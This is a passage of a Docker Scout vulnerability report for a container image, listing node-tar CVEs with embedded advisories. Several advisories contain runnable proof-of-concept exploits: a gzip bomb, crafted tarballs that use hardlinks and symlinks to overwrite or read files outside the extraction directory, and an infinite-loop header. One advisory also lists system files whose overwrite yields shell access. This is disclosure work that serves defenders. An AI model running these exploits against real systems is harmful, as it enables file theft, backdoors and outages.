<h2>:mag: Vulnerabilities of <code>nzilacanadaacr.azurecr.io/nzila-os-union-eyes:wave1a-8596a2a4f523</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>nzilacanadaacr.azurecr.io/nzila-os-union-eyes:wave1a-8596a2a4f523</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:c13c227d822c78a05c4893166c4878c32676a1b1af3039e32c0dbb484b437d5f</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 4" src="https://img.shields.io/badge/critical-4-8b1924"/> <img alt="high: 37" src="https://img.shields.io/badge/high-37-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/medium-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/low-0-lightgrey"/> <!-- unspecified: 0 --></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>274 MB</td></tr>
<tr><td>packages</td><td>1083</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 7" src="https://img.shields.io/badge/H-7-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>tar</strong> <code>6.2.1</code> (npm)</summary>

<small><code>pkg:npm/tar@6.2.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-59873?s=github&n=tar&t=npm&vr=%3C%3D7.5.18"><img alt="critical 9.2: CVE--2026--59873" src="https://img.shields.io/badge/CVE--2026--59873-lightgrey?label=critical%209.2&labelColor=8b1924"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.18</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.19</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.358%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
A **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted "Gzip Bomb" can be used to fill a server's storage and crash services.

### Details
The `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.

Specifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.

### PoC
The following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.

1. Create the exploit script:
```javascript
const fs = require('fs'), z = require('zlib'), t = require('tar');

const d = 'dos_test';
if (fs.existsSync(d)) fs.rmSync(d, {recursive:true});
fs.mkdirSync(d);

// Build 10GB header
const h = Buffer.alloc(512);
h.write('payload');
h.write((10*1024**3).toString(8).padStart(11,'0'), 124); 
h.write('ustar', 257);
let s = 256;
for(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];
h.write(s.toString(8).padStart(6,'0'), 148);

const gz = z.createGzip();
gz.pipe(t.x({cwd: d}));
gz.write(h);

const b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed

const run = () => {
  while (gz.write(b));
  gz.once('drain', run);
};

const monitor = setInterval(() => {
    try {
        const bytes = fs.statSync(`${d}/payload`).size;
        const mb = Math.floor(bytes / (1024 * 1024));
        process.stdout.write(`\r[>] Extracted: ${mb} MB`);
        
        if (mb > 5000) { 
            console.log('\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); 
            process.exit(); 
        }
    } catch {}
}, 50);

process.on('exit', () => {
    clearInterval(monitor);
    console.log('[*] Cleaning up...');
    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});
});

run();
```

2. Run the PoC:
```bash
node poc.js
```

**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being "sent" through the gzip stream is negligible.

### Impact
This is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-23950?s=github&n=tar&t=npm&vr=%3C%3D7.5.3"><img alt="high 8.8: CVE--2026--23950" src="https://img.shields.io/badge/CVE--2026--23950-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Improper Handling of Unicode Encoding</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.3</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.233%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS

**AUTHOR**: Tomás Illuminati

### Details

A race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.

```typescript
// node-tar/src/path-reservations.ts (Lines 53-62)
reserve(paths: string[], fn: Handler) {
    paths =
      isWindows ?
        ['win32 parallelization disabled']
      : paths.map(p => {
          return stripTrailingSlashes(
            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS
          ).toLowerCase()
        })

```

In MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:

``````bash
bash-3.2$ printf "CONTENT_SS\n" > collision_test_ss
bash-3.2$ ls
collision_test_ss
bash-3.2$ printf "CONTENT_ESSZETT\n" > collision_test_ß
bash-3.2$ ls -la
total 8
drwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .
drwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..
-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss
bash-3.2$ 
``````

---

### PoC

``````javascript
const tar = require('tar');
const fs = require('fs');
const path = require('path');
const { PassThrough } = require('stream');

const exploitDir = path.resolve('race_exploit_dir');
if (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });
fs.mkdirSync(exploitDir);

console.log('[*] Testing...');
console.log(`[*] Extraction target: ${exploitDir}`);

// Construct stream
const stream = new PassThrough();

const contentA = 'A'.repeat(1000);
const contentB = 'B'.repeat(1000);

// Key 1: "f_ss"
const header1 = new tar.Header({
    path: 'collision_ss',
    mode: 0o644,
    size: contentA.length,
});
header1.encode();

// Key 2: "f_ß"
const header2 = new tar.Header({
    path: 'collision_ß',
    mode: 0o644,
    size: contentB.length,
});
header2.encode();

// Write to stream
stream.write(header1.block);
stream.write(contentA);
stream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding

stream.write(header2.block);
stream.write(contentB);
stream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding

// End
stream.write(Buffer.alloc(1024));
stream.end();

// Extract
const extract = new tar.Unpack({
    cwd: exploitDir,
    // Ensure jobs is high enough to allow parallel processing if locks fail
    jobs: 8 
});

stream.pipe(extract);

extract.on('end', () => {
    console.log('[*] Extraction complete');

    // Check what exists
    const files = fs.readdirSync(exploitDir);
    console.log('[*] Files in exploit dir:', files);
    files.forEach(f => {
        const p = path.join(exploitDir, f);
        const stat = fs.statSync(p);
        const content = fs.readFileSync(p, 'utf8');
        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);
    });

    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {
        console.log('\[*] GOOD');
    } else {
        console.log('[-] No collision');
    }
});

``````

---

### Impact
This is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.

---

### Remediation

Update `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.

Users who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.

---

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-59874?s=github&n=tar&t=npm&vr=%3C%3D7.5.17"><img alt="high 8.7: CVE--2026--59874" src="https://img.shields.io/badge/CVE--2026--59874-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.17</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.18</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.358%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

A checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.

### Details

The public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.

Tar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.

For a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.

This is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.

### PoC

Save as `poc.mjs` in a project with the vulnerable package installed and run:

```bash
node poc.mjs
```

```js
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { spawnSync } from 'node:child_process'

const oct = (b, n, off, len) =>
  b.write(n.toString(8).padStart(len - 1, '0') + '\0', off, len, 'ascii')

const badHeader = () => {
  const h = Buffer.alloc(512)

  h.write('x', 0)
  oct(h, 0o644, 100, 8)
  oct(h, 0, 108, 8)
  oct(h, 0, 116, 8)

  // base-256 encoded -512 in the size field
  Buffer.alloc(10, 0xff).copy(h, 124)
  h[134] = 0xfe
  h[135] = 0x00

  oct(h, 0, 136, 12)
  h.fill(0x20, 148, 156)
  h[156] = 0x30
  h.write('ustar\0' + '00', 257, 8, 'binary')

  let sum = 0
  for (const c of h) sum += c
  h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148, 8, 'ascii')

  return h
}

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tar-loop-'))
const file = path.join(dir, 'poc.tar')

fs.writeFileSync(file, badHeader())
fs.writeFileSync(path.join(dir, 'add.txt'), 'x')

const r = spawnSync(
  process.execPath,
  [
    '--input-type=module',
    '-e',
    `
      import * as tar from 'tar'
      tar.replace({ file: ${JSON.stringify(file)}, cwd: ${JSON.stringify(dir)}, sync: true }, ['add.txt'])
      console.log('completed')
    `,
  ],
  { timeout: 20_000 }
)

console.log(r.error?.code === 'ETIMEDOUT')

// Output: true
```

### Impact

An application that calls `tar.replace()` on an existing archive supplied or controlled by an attacker can be forced into a non-terminating archive scan. This can consume a worker process indefinitely and cause denial of service. Plain extraction-only workflows are not affected by this finding.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-31802?s=github&n=tar&t=npm&vr=%3C%3D7.5.10"><img alt="high 8.2: CVE--2026--31802" src="https://img.shields.io/badge/CVE--2026--31802-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.10</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.11</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.253%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.

What happens with `linkpath: "C:../../../target.txt"`:
1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.
2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.
3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.
4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.10`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(cwd, 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({
  path: 'a/b/l',
  type: 'SymbolicLink',
  linkpath: 'C:../../../target.txt',
}).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
node poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt
```

Observed output:

```text
PWNED
../../../target.txt
lrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt
.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt
```

`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-29786?s=github&n=tar&t=npm&vr=%3C%3D7.5.9"><img alt="high 8.2: CVE--2026--29786" src="https://img.shields.io/badge/CVE--2026--29786-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.9</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.10</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:L/SC:N/SI:H/SA:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.408%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.

What happens with `linkpath: "C:../target.txt"`:
1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.
2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.
3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.
4. Writing through the extracted hardlink overwrites the outside file.

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.9`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(process.cwd(), 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
cd test-workspace
node poc.cjs && ls -l ../target.txt
```

Observed output:

```text
PWNED
-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt
```

`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-24842?s=github&n=tar&t=npm&vr=%3C7.5.7"><img alt="high 8.2: CVE--2026--24842" src="https://img.shields.io/badge/CVE--2026--24842-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><7.5.7</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.7</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.541%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
node-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.

### Details
The vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:

**Security check in `[STRIPABSOLUTEPATH]`:**
```javascript
const entryDir = path.posix.dirname(entry.path);
const resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));
if (resolved.startsWith('../')) { /* block */ }
```

**Hardlink creation in `[HARDLINK]`:**
```javascript
const linkpath = path.resolve(this.cwd, entry.linkpath);
fs.linkSync(linkpath, dest);
```

**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.

- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.

- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.

The security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.

### PoC
#### Setup

Create a new directory with these files:

```
poc/
├── package.json
├── secret.txt          ← sensitive file (target)
├── server.js           ← vulnerable server
├── create-malicious-tar.js
├── verify.js
└── uploads/            ← created automatically by server.js
    └── (extracted files go here)
```

**package.json**
```json
{ "dependencies": { "tar": "^7.5.0" } }
```

**secret.txt** (sensitive file outside uploads/)
```
DATABASE_PASSWORD=supersecret123
```

**server.js** (vulnerable file upload server)
```javascript
const http = require('http');
const fs = require('fs');
const path = require('path');
const tar = require('tar');

const PORT = 3000;
const UPLOAD_DIR = path.join(__dirname, 'uploads');
fs.mkdirSync(UPLOAD_DIR, { recursive: true });

http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/upload') {
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', async () => {
      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));
      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });
      res.end('Extracted\n');
    });
  } else if (req.method === 'GET' && req.url === '/read') {
    // Simulates app serving extracted files (e.g., file download, static assets)
    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
    if (fs.existsSync(targetPath)) {
      res.end(fs.readFileSync(targetPath));
    } else {
      res.end('File not found\n');
    }
  } else if (req.method === 'POST' && req.url === '/write') {
    // Simulates app writing to extracted file (e.g., config update, log append)
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
      if (fs.existsSync(targetPath)) {
        fs.writeFileSync(targetPath, Buffer.concat(chunks));
        res.end('Written\n');
      } else {
        res.end('File not found\n');
      }
    });
  } else {
    res.end('POST /upload, GET /read, or POST /write\n');
  }
}).listen(PORT, () => console.log(`http://localhost:${PORT}`));
```

**create-malicious-tar.js** (attacker creates exploit TAR)
```javascript
const fs = require('fs');

function tarHeader(name, type, linkpath = '', size = 0) {
  const b = Buffer.alloc(512, 0);
  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);
  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);
  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);
  b.write('        ', 148);
  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;
  if (linkpath) b.write(linkpath, 157);
  b.write('ustar\x00', 257); b.write('00', 263);
  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];
  b.write(sum.toString(8).padStart(6, '0') + '\x00 ', 148);
  return b;
}

// Hardlink escapes to parent directory's secret.txt
fs.writeFileSync('malicious.tar', Buffer.concat([
  tarHeader('d/', 'dir'),
  tarHeader('d/x', 'link', '../secret.txt'),
  Buffer.alloc(1024)
]));
console.log('Created malicious.tar');
```

#### Run

```bash
# Setup
npm install
echo "DATABASE_PASSWORD=supersecret123" > secret.txt

# Terminal 1: Start server
node server.js

# Terminal 2: Execute attack
node create-malicious-tar.js
curl -X POST --data-binary @malicious.tar http://localhost:3000/upload

# READ ATTACK: Steal secret.txt content via the hardlink
curl http://localhost:3000/read
# Returns: DATABASE_PASSWORD=supersecret123

# WRITE ATTACK: Overwrite secret.txt through the hardlink
curl -X POST -d "PWNED" http://localhost:3000/write

# Confirm secret.txt was modified
cat secret.txt
```
### Impact

An attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:

**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.

**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.

### Remote Code Execution / Server Takeover

| Attack Vector | Target File | Result |
|--------------|-------------|--------|
| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |
| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |
| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |
| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |
| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |
| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |

## Data Exfiltration & Corruption

1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations
2. **Read sensitive files** by creating hardlinks that point outside extraction directory
3. **Corrupt databases** and application state
4. **Steal credentials** from config files, `.env`, secrets

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-23745?s=github&n=tar&t=npm&vr=%3C%3D7.5.2"><img alt="high 8.2: CVE--2026--23745" src="https://img.shields.io/badge/CVE--2026--23745-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.2</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.334%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.

### Details

The vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.

**1. Hardlink Escape (Arbitrary File Overwrite)**

The extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.

The library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.

**2. Symlink Poisoning**

The extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.

### PoC

The following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local "secret" file was successfully overwritten.

```javascript
const fs = require('fs')
const path = require('path')
const tar = require('tar')

const out = path.resolve('out_repro')
const secret = path.resolve('secret.txt')
const tarFile = path.resolve('exploit.tar')
const targetSym = '/etc/passwd'

// Cleanup & Setup
try { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}
fs.mkdirSync(out)
fs.writeFileSync(secret, 'ORIGINAL_DATA')

// 1. Craft malicious Link header (Hardlink to absolute local file)
const h1 = new tar.Header({
  path: 'exploit_hard',
  type: 'Link',
  size: 0,
  linkpath: secret 
})
h1.encode()

// 2. Craft malicious Symlink header (Symlink to /etc/passwd)
const h2 = new tar.Header({
  path: 'exploit_sym',
  type: 'SymbolicLink',
  size: 0,
  linkpath: targetSym 
})
h2.encode()

// Write binary tar
fs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))

console.log('[*] Extracting malicious tarball...')

// 3. Extract with default secure settings
tar.x({
  cwd: out,
  file: tarFile,
  preservePaths: false
}).then(() => {
  console.log('[*] Verifying payload...')

  // Test Hardlink Overwrite
  try {
    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')
    
    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {
      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')
    } else {
      console.log('[-] Hardlink failed')
    }
  } catch (e) {}

  // Test Symlink Poisoning
  try {
    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {
      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')
    } else {
      console.log('[-] Symlink failed')
    }
  } catch (e) {}
})

```

### Impact

* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.
* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-26960?s=github&n=tar&t=npm&vr=%3C7.5.8"><img alt="high 7.1: CVE--2026--26960" src="https://img.shields.io/badge/CVE--2026--26960-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
